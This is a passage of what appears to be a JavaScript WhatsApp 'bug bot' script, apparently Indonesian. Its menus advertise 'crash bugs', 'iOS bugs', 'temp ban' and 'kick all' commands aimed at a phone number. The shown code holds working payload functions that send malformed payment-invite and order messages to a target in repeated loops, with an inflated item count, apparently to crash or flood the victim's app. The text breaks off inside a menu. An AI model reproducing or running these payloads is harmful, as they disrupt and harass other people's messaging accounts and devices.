Painzy['relayMessage'](_0x28ef97,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},'interactiveMessage':{'nativeFlowMessage':{'buttons':[{'name':_0x404515(0x128),'buttonParamsJson':JSON['stringify']({'currency':'BRL','total_amount':{'value':0x0,'offset':0x64},'reference_id':_0x404515(0x12b),'type':_0x404515(0x127),'order':{'status':_0x404515(0x12a),'subtotal':{'value':0x0,'offset':0x64},'order_type':_0x404515(0x130),'items':[{'name':'','amount':{'value':0x0,'offset':0x64},'quantity':0x0,'sale_amount':{'value':0x0,'offset':0x64}}]},'payment_settings':[{'type':_0x404515(0x129),'pix_static_code':{'merchant_name':_0x404515(0x124),'key':_0x404515(0x12d),'key_type':'X'}}]})}]}}}}},{'participant':{'jid':_0x28ef97}},{'messageId':null});}

async function ziosX1(target) {
    await Painzy.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'UPI',
                expiryTimestamp: Date.now() + 86400000, // 1 day in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function ziosX2(target) {
    await Painzy.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'galaxy_message',
                expiryTimestamp: Date.now() + 86400000000, // 1000 days in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function ziosX3(target) {
    await Painzy.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'POLLING',
                expiryTimestamp: Date.now() + 86400000000, // 1000 days in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function ziosX4(target) {
    await Painzy.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'FBPAY',
                expiryTimestamp: Date.now() + 1814400000, // 21 days in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function sendAllPaymentInvites(target, repeatCount = 1) {
    for (let i = 0; i < repeatCount; i++) {
        await ziosX1(target)
        await ziosX1(target)
        await ziosX1(target)
        await ziosX1(target)
        await sleep(300)
        
        await ziosX2(target)
        await ziosX2(target)
        await ziosX2(target)
        await ziosX2(target)
        await sleep(300)
        
        await ziosX3(target)
        await ziosX3(target)
        await ziosX3(target)
        await ziosX3(target)
        await sleep(300)
        
        await ziosX4(target)
        await ziosX4(target)
        await ziosX4(target)
        await ziosX4(target)
        await sleep(2300)
    }
}
// BATA FUNCTION //
    
const pain = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      thumbnail: anjay,
      itemCount: 999999999999999,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 999,
    isForwarded: true
  }
};
    
async function downloadMp3 (link) {
try {
Painzy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Painzy.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
Painzy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Painzy.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

//self public
global.public = true
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}

const darkPainz = [
    'https://ibb.co/QML1g9z',
    'https://ibb.co/5BYVvw2'
];

const randomImage = darkPainz[Math.floor(Math.random() * darkPainz.length)];

const reply = (teks) => { 
Painzy.sendMessage(from, { text: teks, contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `𝘎𝘓𝘖𝘉𝘈𝘓`,
body: `Hello ${pushname} 👋`,
previewType: "VIDEO",
thumbnail: anjay,
sourceUrl: `${global.url}`,
mediaUrl: `${global.url}`
}
},
text: teks
}, {
quoted: m
})
}

const reply2 = (teks) => {
Painzy.sendMessage(from, { text : teks }, { quoted : m })
}


function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
		// +minutes+":"+sec;
  }

// Sayying time
const timee = moment().tz('Asia/Karachi').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Good Night 🌃'
}
if(timee < "19:00:00"){
var waktuucapan = 'Good Evening 🌆'
}
if(timee < "18:00:00"){
var waktuucapan = 'Good Evening 🌅'
}
if(timee < "15:00:00"){
var waktuucapan = 'Good Afternoon 🏙'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'
}
if(timee < "05:00:00"){
var waktuucapan = 'Good Morning 🌉'
}
if(timee < "03:00:00"){
var waktuucapan = 'Good Morning 🌌'
}


if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('painzy.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Command You are wrong idiot, this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
reply(response)
}}

switch(command) {

/*
case 'menu': case 'help': {
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: Painzy.waUploadToServer
})
let anu = `HAI ${pushname} TERIMAKASIH TELAH MEMAKAI BOT GlobaL SERIES 9!! 
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
⌜ \`𝗚𝗟𝗢𝗕𝗔𝗟 𝗕𝗨𝗚\`⌟
 𝗛𝘆 *${pushname}*
 𝗝𝗮𝗺 *${timee}*
 𝗧𝗮𝗻𝗴𝗴𝗮𝗹 *${hariini}*
 *${waktuucapan}*
 \`乂 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\`
 𝗢𝘄𝗻 : ${global.namaown}
 𝗕𝗼𝘁 : ${global.namabot}
 𝗩𝗲𝗿𝘀𝗶 : ${global.versisc}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
  𝘜𝘯𝘵𝘶𝘬 𝘔𝘦𝘯𝘢𝘮𝘱𝘪𝘭𝘬𝘢𝘯 𝘉𝘶𝘨𝘔𝘦𝘯𝘶
  𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘒𝘦𝘵𝘪𝘬 .𝙗𝙪𝙜𝙢𝙚𝙣𝙪
  𝘑𝘢𝘯𝘨𝘢𝘯 𝘥𝘪 𝘚𝘢𝘭𝘢𝘩 𝘎𝘶𝘯𝘢𝘬𝘢𝘯
  
  ❮𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎❯
› 𝗤𝗮𝘀𝗶𝗺 ©DevScript
› 𝗤𝗮𝘀𝗶𝗺 ©Creator
› 𝐒𝐤𝐲𝐙𝐞𝐭 ©Sepuh
› 𝐙𝐲𝐧𝐱𝐳𝐨 ©Base
━━━━━━━━━━━━━━━━━━━⬣`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝙔𝙤𝙪𝙏𝙪𝙗𝙚',
url: "${global.url}",
merchant_url: "${global.url}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:pain})
await Painzy.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break
*/


case 'menu': case 'help': case 'alive': {
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: Painzy.waUploadToServer
})

dispMenu = `HELLO ${pushname}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
⌜ \`𝗚𝗟𝗢𝗕𝗔𝗟 𝗕𝗨𝗚\`⌟
 𝗛𝘆 *${pushname}*
 *${timee}*
 *${hariini}*
 *${waktuucapan}*
 [ \`乂 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
 𝐎𝐰𝐧 : ${global.namaown}
 𝐁𝐨𝐭 : ${global.namabot}
 𝐕𝐞𝐫𝐬𝐢 : ${global.versisc}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
𝐁𝐎𝐓 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒
⿻ ꜰᴜɴ-ᴍᴇɴᴜ
⿻ ɢʀᴏᴜᴘ-ᴍᴇɴᴜ
⿻ ᴀᴅᴅ-ᴍᴇɴᴜ
⿻ ꜱᴛᴏʀᴇ-ᴍᴇɴᴜ
⿻ ꜱᴇᴛᴛɪɴɢ-ᴍᴇɴᴜ
⿻ ɪᴏꜱ-ʙᴜɢꜱ
⿻ ᴇᴍᴏᴊɪ-ʙᴜɢꜱ
⿻ ᴄʀᴀꜱʜ-ʙᴜɢꜱ
⿻ ᴡᴀ-ᴄʀᴀꜱʜ
⿻ ᴠɪᴘ-ʙᴜɢꜱ
⿻ ᴛᴇᴍᴘ-ʙᴀɴ
━━━━━━━━━━━━━━━━⬣`

let msgii = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: dispMenu
                }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    hasMediaAttachment: true,
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/png",
                        fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                        jpegThumbnail: fkethmb,
                        fileLength: 120000,
                        mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                        fileName: `⸙ GlobaLModers`,
                        directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                        contactVcard: true,
                        mediaKeyTimestamp: "1658703206"
                    }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Menu List",
                sections: [
                    {
                        title: "⿻ Gᴇɴᴇʀᴀʟ",
                        rows: [
                            { header: "Fun-Menu", title: "!Display Fun Menu", description: "[ # ] GlobaL", id: ".funmenu" },
                            { header: "Group-Menu", title: "!Display Group Menu", description: "[ # ] GlobaL", id: ".groupmenu" },
                            { header: "Store-Menu", title: "!Display Store Menu", description: "[ # ] GlobaL", id: ".storemenu" },
                            { header: "Add-Menu", title: "!Display Add Menu", description: "[ # ] GlobaL", id: ".addmenu" },
                            { header: "Setting-Menu", title: "!Display Settings Menu", description: "[ # ] GlobaL", id: ".settingmenu" }
                        ]
                    }
                ]
            })
        },
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Bug Features",
                sections: [
                    {
                        title: "⿻ Exᴄʟᴜsɪᴠᴇ",
                        rows: [
                            { header: "𝐄𝐌𝐎𝐉𝐈-𝐁𝐔𝐆", title: "!Display Emoji Bugs", description: "[ # ] GlobaL", id: ".emojibugmenu" },
                            { header: "𝐈𝐎𝐒-𝐁𝐔𝐆", title: "!Display IOS Bugs", description: "[ # ] GlobaL", id: ".iosbugmenu" },
                            { header: "𝐂𝐑𝐀𝐒𝐇-𝐁𝐔𝐆", title: "!Display Crash Bugs", description: "[ # ] GlobaL", id: ".crashbugmenu" },
                            { header: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐑𝐀𝐒𝐇", title: "!Display WhatsApp Crashes", description: "[ # ] GlobaL", id: ".wamenu" },
                            { header: "𝐁𝐔𝐆 𝐈𝐍 𝐏𝐋𝐀𝐂𝐄 𝐕𝐈𝐏", title: "!Display VIP Place Bugs", description: "[ # ] GlobaL", id: ".inplacemenu" }
                                                ]
                                            }
                                        ]
                                    })
                                }
                            ]
                        }),
                contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                                  forwardedNewsletterMessageInfo: {
            newsletterJid: my.idCH,
            newsletterName: 'Info Script GlobaL',
                        },
                    externalAdReply: {
                        title: "Special.Project V9.5.0",
                        body: "",
                        thumbnailUrl: global.painlogo, 
                        thumbnail: anjay,
                        sourceUrl: 'https://GlobaL.carrd.co/#',
                        previewType: "VIDEO",
                        showAdAttribution: true,
                        mediaType: 1,
                        renderLargerThumbnail: true
                      }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msgii.key.remoteJid, msgii.message, {
        messageId: msgii.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🦊', key: m.key}})
    }
    break
    
    case 'funmenu': case 'fun': {
funmenuD = `  ❮ \`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\` ❯
${global.simbol} ᴀɪ
${global.simbol} ᴍᴘ4
${global.simbol} ᴘʟᴀʏ
${global.simbol} ᴍᴘ3
${global.simbol} ᴄᴇᴋᴊᴏᴅᴏʜ 
${global.simbol} ᴄᴇᴋᴋᴜᴏᴛᴀ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: funmenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
    
    case 'groupmenu': {
groupmenuD = ` ❮ \`𝐊𝐈𝐂𝐊 𝐀𝐋𝐋\` ❯
${global.simbol} ᴋᴜᴅᴇᴛᴀᴛʜᴘ *<group>*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: groupmenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
    
        case 'storemenu': case 'store': {
storemenuD = `  ❮ \`𝐒𝐓𝐎𝐑𝐄 𝐌𝐄𝐍𝐔\` ❯
${global.simbol} ᴏᴡɴᴇʀ
${global.simbol} ʟɪsᴛ
${global.simbol} ᴘʀᴏsᴇs
${global.simbol} ᴅᴏɴᴇ
${global.simbol} ᴘᴀʏᴍᴇɴᴛ
 ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: storemenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
    
    case 'addmenu': {
addmenuD = `  ❮ \`𝐀𝐃𝐃\` ❯
${global.simbol} ʟɪsᴛᴏᴡɴ
${global.simbol} ᴀᴅᴅᴏᴡɴ
${global.simbol} ᴅᴇʟᴏᴡɴ
${global.simbol} ʟɪsᴛᴘʀᴇᴍ
${global.simbol} ᴀᴅᴅᴘʀᴇᴍ
${global.simbol} ᴅᴇʟᴘʀᴇᴍ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: addmenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
    
    case 'settingmenu': case 'settings': {
settingmenuD = `  ❮ \`𝐒𝐄𝐓𝐓𝐈𝐍𝐆\` ❯
${global.simbol} sᴇʟғ
${global.simbol} ᴘᴜʙʟɪᴄ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: settingmenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
    
        case 'crashbugmenu': case 'crashbug': {
crashbugmenuD = `  ❮ \`𝐂𝐑𝐀𝐒𝐇 𝐁𝐔𝐆\` ❯
${global.simbol} ᴋɪɴɢ *<number>*
${global.simbol} ɪɴғɪɴɪᴛʏ *<number>*
${global.simbol} ᴜɴʟɪᴍɪᴛᴇᴅᴄʀᴀsʜ *<number>*
${global.simbol} xᴄʀᴀsʜ *<number>*
${global.simbol} xᴠɪʀᴜs *<number>*
${global.simbol} ᴛᴇᴍᴘʙᴀɴ *<number>*
